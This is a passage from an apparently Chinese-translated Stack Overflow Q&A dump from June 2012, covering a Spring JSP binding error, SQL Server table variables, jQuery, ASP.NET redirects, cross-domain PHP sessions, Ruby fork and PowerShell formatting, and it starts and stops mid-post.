    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1001)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:662)
22-jun-2012 14:16:40 org.apache.catalina.core.StandardWrapperValve invoke
GRAVE: El Servlet.service() para el servlet [appServlet] en el contexto con ruta [/tryp] lanzó la excepción [Ha sucedido una excepción al procesar la página JSP /WEB-INF/views/administracion/habilidades.jsp en línea 363

360:                        <div class="control-group">
361:                            <label class="control-label" for="codigo"><s:message code="codigo"/></label>
362:                            <div class="controls">
363:                                <f:input type="text" class="span1" name="codigo" path="codigo" />
364:                            </div>
365:                        </div>
366: 

Stacktrace:] con causa raíz
java.lang.IllegalStateException: Neither BindingResult nor plain target object for bean name 'command' available as request attribute
    at org.springframework.web.servlet.support.BindStatus.<init>(BindStatus.java:141)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getBindStatus(AbstractDataBoundFormElementTag.java:178)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getPropertyPath(AbstractDataBoundFormElementTag.java:198)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getName(AbstractDataBoundFormElementTag.java:164)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.autogenerateId(AbstractDataBoundFormElementTag.java:151)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.resolveId(AbstractDataBoundFormElementTag.java:142)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.writeDefaultAttributes(AbstractDataBoundFormElementTag.java:126)
    at org.springframework.web.servlet.tags.form.AbstractHtmlElementTag.writeDefaultAttributes(AbstractHtmlElementTag.java:421)
    at org.springframework.web.servlet.tags.form.InputTag.writeTagContent(InputTag.java:142)
    at org.springframework.web.servlet.tags.form.AbstractFormTag.doStartTagInternal(AbstractFormTag.java:102)
    at org.springframework.web.servlet.tags.RequestContextAwareTag.doStartTag(RequestContextAwareTag.java:79)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspx_meth_f_005finput_005f0(habilidades_jsp.java:1081)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspx_meth_f_005fform_005f0(habilidades_jsp.java:996)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspService(habilidades_jsp.java:476)
    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:690)
    at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:477)
    at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:402)
    at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:329)
    at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:238)
    at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:262)
    at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1180)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:950)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:852)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1001)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:662) 
```

**我的jsp片段：**

```
<div class="modal-body">
            <f:form method="POST" modalAttribute="habilidad" class="form-horizontal em" id="formHabilidad">
                <fieldset>
                    <div class="control-group">
                        <label class="control-label" for="codigo"><s:message code="codigo"/></label>
                        <div class="controls">
                            <f:input type="text" class="span1" name="codigo" path="codigo" />
                        </div>
                    </div>

                    <div class="control-group">
                        <label class="control-label" for="descripcion"><s:message code="descripcion"/></label>
                        <div class="controls">
                            <f:input type="text" class="span3" name="codigo" path="descripcion"/>
                        </div>
                    </div>

                </fieldset>
            </f:form>
        </div> 
```

**我的控制器的一部分：**

```
 @RequestMapping(value = "/habilidades", method = RequestMethod.GET)
  public String getHabilidades(Model model) {
      model.addAttribute("habilidades",aService.getHabilidades(new User()));
      model.addAttribute("habilidad",new Habilidad());
      return "administracion/habilidades";
  }

  @RequestMapping(value = "/JSONHabilidades", method = RequestMethod.GET)
  public @ResponseBody List<Habilidad> getJSONTHabilidades(Model model) {   
      return aService.getHabilidades(new User());
  }

  @RequestMapping(value = "/habilidades", method = RequestMethod.POST)
  public @ResponseBody Habilidad postHabilidades(@ModelAttribute Habilidad habilidad, HttpSession session) {
      habilidad.setEscala((Escala)session.getAttribute("escala"));
      return  aService.saveOrUpdate(habilidad);
  }

  @RequestMapping(value = "/deleteHabilidad", method = RequestMethod.POST)
  public @ResponseBody Habilidad deleteHabilidad(Habilidad habilidad) {
    return  aService.delete(habilidad);
  } 
```

**我的实体Habilidad.java：**

```
@Entity
@Table(name="TTR_HABILIDAD")
public class Habilidad implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    @SequenceGenerator(name = "G3", sequenceName = "SEQ_HABILIDAD_ID_HABILIDAD")
    @GeneratedValue(strategy = GenerationType.AUTO, generator = "G3")
    @Column(name="ID_HABILIDAD", unique = true, nullable = false, precision = 22)
    private Long idHabilidad;

    @Column(nullable = false, length = 256)
    private String codigo;

    @Column(length = 256)
    private String descripcion;

    //bi-directional many-to-many association to Empleado
    @ManyToMany
    @JoinTable(
        name="TTR_HABILIDAD_EMP"
        , joinColumns={
            @JoinColumn(name="ID_HABILIDAD")
            }
        , inverseJoinColumns={
            @JoinColumn(name="ID_EMPLEADO")
            }
        )
    private Set<Empleado> empleados;

    // bi-directional many-to-one association to Escala
    @JsonIgnore
    @ManyToOne(fetch = FetchType.EAGER)
    @JoinColumn(name = "ID_ESCALA", nullable = false)
    private Escala escala;

    public Habilidad() {
    }

    public Long getIdHabilidad() {
        return this.idHabilidad;
    }

    public void setIdHabilidad(Long idHabilidad) {
        this.idHabilidad = idHabilidad;
    }

    public String getCodigo() {
        return this.codigo;
    }

    public void setCodigo(String codigo) {
        this.codigo = codigo;
    }

    public String getDescripcion() {
        return this.descripcion;
    }

    public void setDescripcion(String descripcion) {
        this.descripcion = descripcion;
    }

    public Escala getEscala() {
        return this.escala;
    }

    public void setEscala(Escala escala) {
        this.escala = escala;
    }

} 
```

**我的实体HabilidadDAO.java：**

```
public interface HabilidadDAO extends GenericDAO<Habilidad, Long> {
    public List<Habilidad> getHabilidades(User u);

} 
```

**我的实体HabilidadDAOImpl.java**

```
@Repository
@Transactional(readOnly = true)
public class HabilidadDAOImpl extends GenericDAOImpl<Habilidad, Long>  implements HabilidadDAO {

    @SuppressWarnings("unchecked")
    public List<Habilidad> getHabilidades(User u){
        Query q = em.createQuery("SELECT h FROM Habilidad h");
        return q.getResultList();
    }

} 
```

**编辑：该错误已得到修复，但控制器没有获得输入的值。要修复此错误：我必须将属性 modalAttribute 更改为 modelAtrribute。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:02:39.283

阅读这篇[文章](https://stackoverflow.com/questions/6442956/with-spring-3-annotations-jsr303-getting-neither-bindingresult-nor-plain-target)。您在控制器调用中缺少注释`@modelAttribute`。

```
public @ResponseBody Habilidad postHabilidades(@ModelAttribute Habilidad habilidad, HttpSession session) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:04:55.147

在您的控制器中，替换

```
public @ResponseBody Habilidad postHabilidades(Habilidad habilidad, HttpSession session) 
```

和

```
public @ResponseBody Habilidad postHabilidades(@ModelAttribute Habilidad habilidad, HttpSession session) 
```

# sql - 我们可以在sql server 2008中有数组类型的数据吗

> ID：11155393
> 
> 赞同：11
> 
> 时间：2012-06-22T11:33:27.440
> 
> 标签：sql, sql-server, sql-server-2008

我们可以在 sql server 2008 中有数组类型的数据吗？目前我使用逗号分隔值作为数组值处理

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-22T11:36:33.880

SQL Server 2005+ 支持表值变量：

```
declare @arr table (col1 int)
insert @arr (col1) values (3), (1), (4) 
```

这些等价于数组。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-22T11:41:38.093

您可以改用：
1.[表](http://msdn.microsoft.com/en-us/library/ms174979.aspx)
2.[临时表](http://msdn.microsoft.com/en-us/library/ms174979.aspx)
3.[表变量 (2005+)](http://msdn.microsoft.com/en-us/library/ms175010.aspx)
4.[表值参数 (2008+)](http://msdn.microsoft.com/en-us/library/bb510489.aspx)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-22T11:40:12.137

用户定义的表：

如果你想了解更多，这篇文章被广泛引用：

[http://www.sommarskog.se/arrays-in-sql-2008.html](http://www.sommarskog.se/arrays-in-sql-2008.html)

SQL Server 2008 中引入了表值参数。

# jquery - 当 id 存在于 localStorage 变量中时，如何通过 id 使用 jQuery append()？

> ID：11155395
> 
> 赞同：1
> 
> 时间：2012-06-22T11:33:35.183
> 
> 标签：jquery, cordova

我想使用 id 作为我的选择器来使用 jquery append()，但是 id 存储在本地变量中。我已经尝试了以下代码，但它不起作用。我究竟做错了什么？

```
$('#'+localStorage.productUrl+'').append('<span>item is added</span>'); 
```

这是我的代码：http: [//jsfiddle.net/tCuKt/20](http://jsfiddle.net/tCuKt/20)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:15:51.350

我假设您可能已经忘记了`document.ready()`上面提到的，但是附加到选择器末尾的双单引号也毫无意义。这应该是您需要的：

```
$(document).ready(function() {
    $('#' + localStorage.productUrl).append('<span>item is added</span>');
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:48:25.863

我不确定“这不起作用”是什么意思。但是如果`localStorage.productUrl`包含要在其上附加 span 的元素的 id，那么它应该可以工作。还要确保你的 jquery 在里面。

```
$(document).ready(function() {
  // Handler for .ready() called.
}); 
```

**看演示：-**

[http://jsfiddle.net/tCuKt/1/](http://jsfiddle.net/tCuKt/1/)

**编辑：- 更新小提琴**

[http://jsfiddle.net/tCuKt/25](http://jsfiddle.net/tCuKt/25)

# windows-phone-7 - Windows phone 按钮没有默认空间？

> ID：11155396
> 
> 赞同：0
> 
> 时间：2012-06-22T11:33:39.140
> 
> 标签：windows-phone-7

是否可以最小化按钮每一侧的默认边框？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:51:53.750

试试下面的，

当您在 Blend 中打开您的项目时。右键单击按钮，进入编辑模板，编辑当前。您会发现每个按钮都有一个网格和一个容器。然后使两者的大小相等，您会看到默认边框的大小与按钮的大小相同。

相同的模板也可以用于其他按钮。

# asp.net - asp.net 中的 aspx 和 .cs 页面上的警报脚本和 response.redirect

> ID：11155397
> 
> 赞同：0
> 
> 时间：2012-06-22T11:33:44.477
> 
> 标签：asp.net

我在我的 aspx 页面中使用了这个脚本管理器。

```
ScriptManager.RegisterStartupScript(this, this.GetType(), "Redit", "alert('Registered Successfully !!'); window.location='" + Request.ApplicationPath + "/admin/CreateSubAdmin.aspx';", true); 
```

当我在本地服务器中使用它时，它工作正常。和 url 看起来像：主机 url:xyz.aspx/admin/CreateSubAdmin.aspx

下划线部分在管理部分。

但在服务器上这不能正常工作。它看起来像：/admin/CreateSubAdmin.aspx 而已。

但我希望它显示为 www.xyz.com/admin/CreateSubAdmin.aspx。

所以我写错了。请帮助我。

提前致谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T11:48:47.223

您唯一必须做的就是删除`ApplicationPath`, 或删除第一个斜线。

```
ScriptManager.RegisterStartupScript(this, this.GetType(), "Redit",
 "alert('Registered Successfully !!'); window.location='" + Request.ApplicationPath + "admin/CreateSubAdmin.aspx';", true); 
```

或者

```
ScriptManager.RegisterStartupScript(this, this.GetType(), "Redit", 
 "alert('Registered Successfully !!'); window.location='/admin/CreateSubAdmin.aspx';", true); 
```

这里的问题是如何制作适用于您的案例的完整网址。

您可以选择使用 来构建它`"http:" + Request.Url.Host`以获得完整的 url

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:58:28.483

我使用这样的辅助函数：

```
public static string GetApplicationRoot()
{
    string host = HttpContext.Current.Request.Url.GetLeftPart(UriPartial.Authority);
    string applicationPath = HttpContext.Current.Request.ApplicationPath;
    if (applicationPath == "/")
    {
        return host;
    }
    else
    {
        return host + applicationPath;
    }
} 
```

# php - 如何在php中生成唯一的会话ID

> ID：11155403
> 
> 赞同：7
> 
> 时间：2012-06-22T11:33:57.333
> 
> 标签：php, session, sessionid

在我们的网站上，我们希望能够跨多个域共享会话。所有这些网站都在同一台服务器上，但其中一些具有不同的 IP 地址。

我找到的可能解决方案是自己设置会话 ID：

```
<?php
session_id($someUniqueHash);
?> 
```

如果我制作像 md5('test') 这样的散列，这很有效。在同一台服务器上的另一个域上，我们再次进行了会话。

问题是生成 ID。我在互联网上看到了一些带有 microtime 等的解决方案，但是当我使用这种方法时，我无法预测其他域/PHP 页面上的会话 ID。

有人有想法吗？或者我们不应该实施这个吗？是否有其他选项可以在多个域上共享会话？（不是子域！）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-16T00:22:31.120

我已经通过使用[OAuth](http://4.bp.blogspot.com/-VHDPx3n6WrA/TySdnddhxyI/AAAAAAAAAf0/UQwQ9XxwkBs/s1600/oauth_diagram.png)类型流实现了这个系统，但是我们用用户替换了消费者。

因此，每个域都会在其自己的会话中拥有经过身份验证的 Access_Token。然后，您将使用该 Access_Token 从 api 获取有关用户的信息。

[我还使用session_set_save_handler](http://php.net/session_set_save_handler)解决了会话问题，并将会话存储在数据库表中......该表也将具有 Access_Token，使得使用数据库查询查找会话变得非常容易。

希望这有助于想法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-23T20:20:40.413

分别配置每个站点：

```
<?php

$cfgsession['file'] = "../sessions_global.txt";
$cfgsession['keepalive'] = 7200;

?> 
```

要让多个站点共享会话，让它们使用相同的`$cfgsession['file']`. 将来自一个站点的会话包含在对另一个域的请求中（可能是 Jack 推荐的），并且只要您没有发现他们在另一个浏览器或其他任何方式中发出请求（请采取*措施*阻止会话劫持），让他们使用 $_GET 指定会话。例如：

```
include ("../session.php");
if (isset($_COOKIE['session'])) session_begin($_COOKIE['session'], $_SERVER['HTTP_USER_AGENT'] . "+" . $_SERVER['HTTP_ACCEPT_CHARSET'], $_SERVER['REMOTE_ADDR']);
else session_begin("", $_SERVER['HTTP_USER_AGENT'] . "+" . $_SERVER['HTTP_ACCEPT_CHARSET'], $_SERVER['REMOTE_ADDR']);
setcookie("session", session_identity(), 0); 
```

然后只需滚动您自己的 session_ 函数：

```
<?php

function session_begin($mysession = "", $key = "", $client = "") {
  global $cfgsession;
  if (!preg_match("/^[a-z0-9]{32}$/i", $mysession)) $mysession = md5(microtime());
  $error = false;
  $client = trim($client);
  $key = trim($key);
  $cfgsession['returning'] = false;
  if ($chandle = @tmpfile()) {
    if ($shandle = @fopen($cfgsession['file'], "rb")) {
      flock($shandle, LOCK_SH);
      fputs($chandle, $mysession . " " . time() . " $" . $client . " $" . $key . "\n");
      while (!feof($shandle)) {
        $sline = explode(" ", trim(fgets($shandle)), 4);
        if ($sline[1] >= (time() - $cfgsession['keepalive'])) {
          if (($sline[0] == $mysession) && ($sline[3] == "$" . $key)) {
            $cfgsession['client'] = substr($sline[2], 1);
            $cfgsession['returning'] = true;
          } elseif (count($sline) > 2) fputs($chandle, implode(" ", $sline) . "\n");
        }
      }
      fclose($shandle);
      fseek($chandle, 0);
      if ($shandle = @fopen($cfgsession['file'], "cb")) {
        if (flock($shandle, LOCK_EX)) {
          ftruncate($shandle, 0);
          $cfgsession['count'] = 0;
          while (!feof($chandle)) {
            $cline = trim(fgets($chandle));
            fputs($shandle, $cline . "\n");
            $cfgsession['count']++;
          }
        } else $error = true;
        fclose($shandle);
      } else $error = true;
    } else $error = true;
    fclose($chandle);
  } else $error = true;
  if (($cfgsession['returning'] == false) && ($mysession == $cfgsession['session'])) {
    $cfgsession['returning'] = true;
    $mysession = md5(microtime());
  }
  $cfgsession['session'] = $mysession;

  if ($error) return -1;
  else return 0;
}

function session_count() {
  global $cfgsession;
  return $cfgsession['count'];
}

function session_client() {
  global $cfgsession;
  return $cfgsession['client'];
}

function session_id() {
  global $cfgsession;
  return $cfgsession['session'];
}

function session_index() {
  global $cfgsession;
  $index_return = array();
  if ($uhandle = @fopen($cfgsession['file'], "rb")) {
    flock($uhandle, LOCK_SH);
    while (!feof($uhandle)) {
      $uline = explode(" ", trim(fgets($uhandle)), 4);
      foreach ($uline as &$value) {
        if ($value[0] == "$") $value = substr($value, 1);
      }
      if (count($uline) >= 2) $index_return[] = $uline;
    }
    fclose($uhandle);
  }
  return $index_return;
}

function session_returning() {
  global $cfgsession;
  return $cfgsession['returning'];
}

?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:41:16.833

嗯，这是一个困难的。

众所周知，当用户返回您的站点并且没有跨域 cookie 的方法时，PHP 使用 cookie 来理解 session_ids：[跨域 cookie](https://stackoverflow.com/questions/1084114/cross-domain-cookies) （编辑：有，但方法很复杂）。

这可能就是为什么我从来没有见过一个网站实现这个，即使他们有不同的域。

您可以通过页面上的链接从一个域通过 $_GET 或 $_POST 将会话 ID 传递到下一个域。如果用户直接进入您的其他站点，这将不起作用。

我能想到的唯一部分（不可靠）的方法是在数据库中记录用户计算机并使用它来了解它附加到哪个会话。因此，您将计算机的 IP 地址以及可能的其他一些详细信息保存在会话中。

个人计算机的 IP 和其他详细信息会将他们登录到其他域。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T11:59:26.233

也许这不是你的选择，但你可以试试这个。

在您的主站点上，您可以正常生成会话 ID，并将会话永久保存到另一个域，您可以在 URL 中包含带有会话 ID 的图像标签。作为响应，另一个域将设置一个 cookie，这样当访问者来到那里时，它就已经知道会话 ID。

感觉有点聪明的裤子解决方案，但如果您没有太多其他域，它应该可以工作:) 顺便说一句，可以在浏览器中单独禁用第三方 cookie，这需要考虑。

哦，顺便说一句，会话采用（通过查询参数接受 id 并设置 cookie）是微妙的东西，应该受到保护，即会话必须在设置 cookie 之前已经存在。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-05-22T15:18:05.653

If these are login sessions, consider using a single sign on (SSO) solution such as those that implement the SAML standard.

# java - 对 DAOS 对象的访问对 Java API 是透明的吗？

> ID：11155405
> 
> 赞同：1
> 
> 时间：2012-06-22T11:34:00.363
> 
> 标签：java, lotus-notes, lotus, lotus-domino

IBM 的 developerWorks 站点上一篇关于 DAOS 的文章（[IBM Lotus Domino 走向绿色：新的 Lotus Domino 附件和对象服务](http://www.ibm.com/developerworks/lotus/library/domino-green/)）提到

> 附件合并对用户完全透明。

和

> 对 DAOS 对象的访问对 Lotus Domino 服务器和应用程序是透明的：
> 
> *   Lotus Notes 大对象由 Lotus Notes ACL 加密和控制。
> *   DAOS 对 C API 调用、代理和 LotusScript® 是透明的。

DAOS 对 Java API 调用也是透明的吗？我想是的，但如果不是，我会很感激一些确认或信息（示例代码等）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:22:28.983

是的。由于 Java 调用不直接与 NSF 交互，Java 代码永远不会注意到数据库结构的任何变化。

# javascript - 如何获取拖动图像相对于拖动图像的位置？

> ID：11155407
> 
> 赞同：1
> 
> 时间：2012-06-22T11:34:08.780
> 
> 标签：javascript, jquery, html, jquery-mobile

我正在使用带有 java 脚本的拖放（jQuery 方法）。图像被拖到另一个分区上。现在我想知道被拖动的图像相对于它被拖动的分区的位置。

# c# - 通过不同的线程运行一个进程

> ID：11155408
> 
> 赞同：0
> 
> 时间：2012-06-22T11:34:13.803
> 
> 标签：c#, multithreading, process

我有一些重量级的进程，它做一些视频处理。我想运行它（使用`Process.Start()`），所以它使用来自线程池的不同线程。是否可以在不同的线程中运行一个进程？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:45:48.517

如果该进程不是在考虑多线程的情况下构建的，那么不，您不能强制它并行运行。并行性是在代码中明确定义的，不是主机系统可以强制执行的。

假设这是一个数据并行问题，您可以将 EXE 作为跨多个线程的单独进程启动。不过，您需要编写代码来在处理之前和之后分离和合并您的数据。这是否可能/可行完全取决于数据的性质。

# ruby - 子进程为 fork 调用返回 nil

> ID：11155417
> 
> 赞同：0
> 
> 时间：2012-06-22T11:34:58.380
> 
> 标签：ruby, unix, process

```
puts "Process #{Process.pid} started"
return_value = fork
puts "Process #{Process.pid} returned #{return_value}"
puts "Process #{Process.pid} exited" 
```

上面的 ruby​​ 代码将此输出打印到 STDOUT

```
Process 6644 started
Process 6644 returned 6645
Process 6644 exited
Process 6645 returned 
Process 6645 exited 
```

父进程执行`fork`时，返回子进程的pid。当子进程调用`fork`为什么它返回`nil`时，这不应该是递归调用吗？就像.. child 也分叉了另一个子进程.. 而那个子进程分叉了另一个进程..等等，我在这里遗漏了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T13:37:19.943

这是您在代码中区分代码是在父进程中还是在子进程中运行的方式：父进程接收分叉子进程的 PID，子进程获得`nil`.

就个人而言，我更喜欢使用以下语法：

```
pid = fork do
  # this is the code that will be executed by the child
end

# this is the code executed by parent 
```

由于大多数时候，子进程应该做的不是父进程，所以这段代码更好地反映了意图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T18:28:49.533

我想你确实错过了一点，我参考了 Ruby fork 文档，调用带有块的 fork 执行了它下面的代码两次，一次用于父级，另一次用于子级（fork 进程），child fork **return nil**

你如果你检查你的输出

```
Process 6644 started  -- Parent Process Started
Process 6644 returned 6645 -- Parent Process displaying the retrun value = child process id
Process 6644 exited   -- Parent Process exiting
Process 6645 returned  -- Child Process forked earlier and since there return value is nil
Process 6645 exited  -- Child Process exiting 
```

检查关于 fork 的 Ruby[文档](http://www.ruby-doc.org/core-1.9.3/Process.html#method-c-fork)，这种形式的 fork 声明与@psyho 回答的块问题明显混淆。

我建议您使用@psycho 回答的相同声明，因为这很令人困惑

希望这有帮助

# powershell - 查询子集合

> ID：11155421
> 
> 赞同：1
> 
> 时间：2012-06-22T11:35:10.853
> 
> 标签：powershell, powershell-3.0

我正在使用 Powershell v3.0 的 RC 我想知道如何在返回的对象中查询和显示列表（例如结果中的“ExportedCommands”属性`Get-Module -ListAvailable`）：

```
PS H:\> get-module -ListAvailable

    Directory: C:\Windows\system32\WindowsPowerShell\v1.0\Modules

ModuleType Name                                ExportedCommands
---------- ----                                ----------------
Manifest   AppLocker                           {Set-AppLockerPolicy, Get-AppLockerPolicy, Test-AppLockerPolicy, Get-...
Manifest   BitsTransfer                        {Add-BitsFile, Remove-BitsTransfer, Complete-BitsTransfer, Get-BitsTr...
Manifest   CimCmdlets                          {Get-CimAssociatedInstance, Get-CimClass, Get-CimInstance, Get-CimSes... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:58:01.433

嗯..这一切都取决于两个因素：

*   您的收藏实际上是什么（在此命令中-您可以使用字典）
*   你想*看到*它还是*采取行动*。

在这种情况下，知道这是一个字典集合，您可以：

```
Get-Module -ListAvailable | 
    Format-List Name, @{ 
        Name = 'ExportedCommands'
        Expression = { 
            $_.ExportedCommands.Keys -join "`n" 
        }
    } 
```

.. 或者您可以直接使用这些键 - 但您将失去对模块的跟踪。或者你可以反转它：

```
Get-Command | Sort Module | Format-Table Name -GroupBy Module 
```

但同样：这只是为了*显示*数据。如果要对其进行操作， format-* 将无济于事，您应该改用 select （可能带有 -expand 参数）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T09:09:37.087

OP 帖子中的问题是，默认情况下，PowerShell 仅显示此类型重复组中的前 N ​​个值。因此，对于导出的命令，您只能看到前 4 个（默认为 4 个）。要改变这一点，只需为变量 $FormatEnumerationLimit 设置一个更高的值。并且根据 Format-Table 的能力，您可能还需要在指向 FT 的显式管道上指定 -wrap，如下所示：

```
PSH [C:\foo]: $FormatEnumerationLimit = 99
PSH [C:\foo]: get-module -ListAvailable | ft -wrap

    Directory: C:\Users\tfl.COOKHAM\Documents\WindowsPowerShell\Modules

ModuleType Name                                ExportedCommands
---------- ----                                ----------------
Manifest   Audit
Script     authenticode                        {New-PoshCode, Get-PoshCode, Get-PoshCodeUpgrade, Get-WebFile, Set-DownloadFlag,
                                               Remove-DownloadFlag, Get-DownloadFlag, Test-DownloadFlag, block, unblock,
                                               Search-PoshCode}
Script     DotNet                              {Get-Type, Get-ProgID, Get-CommandWithParameterType}
Manifest   DTW.PS.FIleSystem                   Get-DTWFileEncoding
Manifest   DTW.PS.PrettyPrinterV1              Get-DTWFileEncoding
Script     EZOut                               {Add-FormatData, Clear-FormatData, Remove-FormatData, Out-FormatData,
                                               Show-CustomAction, Write-FormatView, Write-CustomAction, Write-FormatTableView,
                                               Get-FormatFile, Find-FormatView, Get-PropertySet, Add-TypeData, Clear-TypeData,
                                               Remove-TypeData, Out-TypeData, Write-TypeView}
Script     FileSystem                          {Copy-ToZip, Get-DuplicateFile, Get-FreeDiskSpace, Get-SHA1, New-Zip,
                                               Mount-SpecialFolder, Rename-Drive, Resolve-ShortcutFile, Start-FileSystemWatcher}
Manifest   FileTransfer                        {Add-BitsFile, Remove-BitsTransfer, Complete-BitsTransfer, Get-BitsTransfer,
                                               Start-BitsTransfer, Resume-BitsTransfer, Set-BitsTransfer, Suspend-BitsTransfer}
Manifest   hyperv                              {Add-ZIPContent, ConvertTo-Enum, Copy-ZipContent, Get-ZIPContent, Select-Item,
                                               Select-List, Select-EnumType, Out-Tree, Select-Tree, Test-Admin,
                                               Convert-DiskIDtoDrive, Get-FirstAvailableDriveLetter, New-Zip, Test-WMIJob,
                                               Test-WMIResult}
Script     IsePack                             {Add-ForeachStatement, Add-IfStatement, Add-InlineHelp, Add-IseMenu,
                                               Add-Parameter, Add-PInvoke, Add-SwitchStatement, Close-AllOpenedFiles,
                                               ConvertTo-ShortcutKeyTable, Copy-Colored, Copy-ColoredHTML, Export-FormatView,
                                               Get-CurrentOpenedFileToken, Get-CurrentToken, Get-FunctionFromFile,
                                               Get-TokenFromFile, Invoke-Line, Move-ToLastGroup, Move-ToLastPowerShellTab,
                                               Move-ToNextGroup, Move-ToNextPowerShellTab, New-IseScript,
                                               New-ScriptModuleFromCurrentLocation, Push-CurrentFileLocation,
                                               Save-IseFileWithAutoName, Select-AllInFile, Select-CurrentText,
                                               Select-CurrentTextAsCommand, Select-CurrentTextAsType,
                                               Select-CurrentTextAsVariable, Show-HelpForCurrentSelection, Show-Member,
                                               Show-SyntaxForCurrentCommand, Show-TypeConstructor,
                                               Show-TypeConstructorForCurrentType, Split-IseFile, Switch-CommentOrText,
                                               Switch-SelectedCommentOrText, Write-ColorizedHTML} 
```

...为简洁起见截断**

# java - 错误：如何在 Excel 中读取空单元格

> ID：11155428
> 
> 赞同：3
> 
> 时间：2012-06-22T11:35:38.957
> 
> 标签：java, excel, apache-poi

我正在尝试使用 POI 从 excel 中读取数据。如何检查这是否是一个空单元格？

我不知道缺少什么我认为这应该有效：

```
java.util.Iterator<Row> rows = worksheet.rowIterator();

